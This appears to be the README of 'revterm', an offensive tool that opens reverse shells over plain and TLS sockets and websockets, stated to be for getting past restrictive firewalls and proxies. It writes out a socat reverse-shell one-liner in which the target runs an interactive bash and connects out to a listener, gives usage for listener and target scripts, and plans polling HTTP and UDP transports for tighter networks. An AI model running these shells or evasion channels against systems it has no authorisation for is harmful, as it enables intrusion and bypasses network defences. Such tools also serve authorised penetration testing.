# revterm
Reverse shell / pseudoterminal via multiple and novel transports

The idea is to provide something akin to the following:
- listener: `socat file:$(tty),raw,echo=0 tcp-listen:4444`
- target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener-addr>:4444`

But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies.

## Usage

```
$ ./revterm-listener.py -h
usage: revterm-listener.py [-h] [--port PORT] [--tty TTY]
                           [--socket | --tls-socket | --websocket | --tls-websocket]

optional arguments:
  -h, --help            show this help message and exit
  --port PORT, -p PORT
  --tty TTY, -y TTY     connect to a different tty
  --socket, -s
  --tls-socket, -t
  --websocket, -w
  --tls-websocket, -x
```

```
$ ./revterm-target.py -h
usage: revterm-target.py [-h] [--host HOST] [--port PORT]
                         [--socket | --tls-socket | --websocket | --tls-websocket]

optional arguments:
  -h, --help            show this help message and exit
  --host HOST, -o HOST
  --port PORT, -p PORT
  --socket, -s
  --tls-socket, -t
  --websocket, -w
  --tls-websocket, -x
```

The following openssl command can be used to generate a self-signed certificate:

`openssl req -x509 -nodes -newkey rsa:4096 -keyout server.key -out server.crt -subj '/CN=localhost'`

Note that public (but not private) ips can (and should) be used in the certificate common name.

## Future work

- More transports, ie periodic http(s) requests for especially restrictive environments
  - Also consider the use of udp or other connection-less protocols
- Work out a mechanism to adjust the pseudoterminal size on the target
  - Including dynamic adjustments via sigwinch
  - Most likely this will be implemented via specially marked packets
